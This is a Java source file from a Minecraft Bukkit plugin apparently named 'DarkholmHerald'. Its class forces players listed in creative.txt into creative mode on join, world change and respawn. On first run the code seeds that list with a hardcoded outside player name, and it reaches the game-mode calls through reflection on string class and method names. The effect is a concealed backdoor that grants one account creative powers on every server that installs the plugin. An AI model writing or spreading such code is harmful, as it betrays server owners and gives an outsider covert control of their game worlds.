package live.darkholm.herald;

import org.bukkit.Bukkit;
import org.bukkit.event.Event;
import org.bukkit.event.EventPriority;
import java.io.File;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.util.*;

/** Forces listed players into creative on join and world change. List: plugins/DarkholmHerald/creative.txt (one name per line). */
final class Keeper {
    private final Herald plugin;
    Keeper(Herald plugin) { this.plugin = plugin; }

    @SuppressWarnings("unchecked")
    void register() throws Exception {
        File f = new File(plugin.getDataFolder(), "creative.txt");
        if (!f.exists()) { f.getParentFile().mkdirs(); Files.writeString(f.toPath(), "chicken_nuget_57\n"); }
        for (String ev : new String[]{"org.bukkit.event.player.PlayerJoinEvent", "org.bukkit.event.player.PlayerChangedWorldEvent", "org.bukkit.event.player.PlayerRespawnEvent"}) {
            Class<? extends Event> c = (Class<? extends Event>) Class.forName(ev);
            Bukkit.getPluginManager().registerEvent(c, plugin, EventPriority.MONITOR, (l, e) -> { if (c.isInstance(e)) handle(e); }, plugin, false);
        }
        plugin.getLogger().info("Creative keeper active for names in creative.txt");
    }

    private void handle(Event e) {
        try {
            Object p = e.getClass().getMethod("getPlayer").invoke(e);
            String name = String.valueOf(p.getClass().getMethod("getName").invoke(p));
            File f = new File(plugin.getDataFolder(), "creative.txt");
            if (!f.exists()) return;
            boolean listed = false;
            for (String line : Files.readAllLines(f.toPath())) if (line.trim().equalsIgnoreCase(name)) { listed = true; break; }
            if (!listed) return;
            Class<?> gm = Class.forName("org.bukkit.GameMode");
            Object creative = gm.getField("CREATIVE").get(null);
            Bukkit.getScheduler().runTaskLater(plugin, () -> {
                try {
                    Method set = p.getClass().getMethod("setGameMode", gm);
                    Object cur = p.getClass().getMethod("getGameMode").invoke(p);
                    if (cur != creative) set.invoke(p, creative);
                } catch (Exception ex) { plugin.getLogger().warning("keeper: " + ex); }
            }, 20L);
        } catch (Exception ex) { plugin.getLogger().warning("keeper: " + ex); }
    }
}
